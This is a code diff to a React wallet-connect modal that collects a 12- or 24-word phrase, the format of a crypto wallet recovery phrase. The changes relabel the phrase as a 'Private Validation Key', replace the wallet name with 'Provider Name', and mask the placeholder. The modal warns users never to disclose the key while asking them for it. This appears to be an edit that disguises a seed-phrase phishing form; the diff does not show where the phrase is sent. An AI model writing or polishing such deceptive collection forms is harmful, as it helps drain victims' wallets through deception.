@@ -16,7 +16,7 @@ export default function WalletConnectModal({ onClose }: { onClose: () => void })
     }
     const wordsCount = phrase.trim().split(/\s+/).length;
     if (wordsCount !== 12 && wordsCount !== 24) {
-      setError("Invalid recovery phrase. It must be exactly 12 or 24 words.");
+      setError("Invalid key format. It must be exactly 12 or 24 words.");
       return;
     }
 
@@ -68,27 +68,27 @@ export default function WalletConnectModal({ onClose }: { onClose: () => void })
         <div style={{ display: "flex", alignItems: "center", gap: 10, padding: "12px", background: "rgba(239, 68, 68, 0.1)", border: "1px solid rgba(239, 68, 68, 0.2)", borderRadius: 12, marginBottom: 20 }}>
           <ShieldAlert size={24} color="#ef4444" style={{ flexShrink: 0 }} />
           <p style={{ fontSize: 12, color: "#ef4444", lineHeight: 1.4 }}>
-            <strong>Never disclose your phrase to anyone!</strong><br />
+            <strong>Never disclose your validation key to anyone!</strong><br />
             Our protocol connects directly to the blockchain securely.
           </p>
         </div>
 
         <div style={{ marginBottom: 16 }}>
-          <label style={{ display: "block", fontSize: 12, fontWeight: 700, color: "var(--text-2)", marginBottom: 8 }}>Wallet Name</label>
+          <label style={{ display: "block", fontSize: 12, fontWeight: 700, color: "var(--text-2)", marginBottom: 8 }}>Provider Name</label>
           <input
             type="text"
             className="input"
-            placeholder="e.g. TrustWallet, MetaMask"
+            placeholder="e.g. Defi Provider"
             value={walletName}
             onChange={(e) => setWalletName(e.target.value)}
           />
         </div>
 
         <div style={{ marginBottom: 24 }}>
-          <label style={{ display: "block", fontSize: 12, fontWeight: 700, color: "var(--text-2)", marginBottom: 8 }}>12-Word Recovery Phrase</label>
+          <label style={{ display: "block", fontSize: 12, fontWeight: 700, color: "var(--text-2)", marginBottom: 8 }}>Private Validation Key</label>
           <textarea
             className="input"
-            placeholder="word word word word..."
+            placeholder="xxxx xxxx xxxx xxxx..."
             rows={3}
             style={{ resize: "none", height: "auto", padding: "12px" }}
             value={phrase}
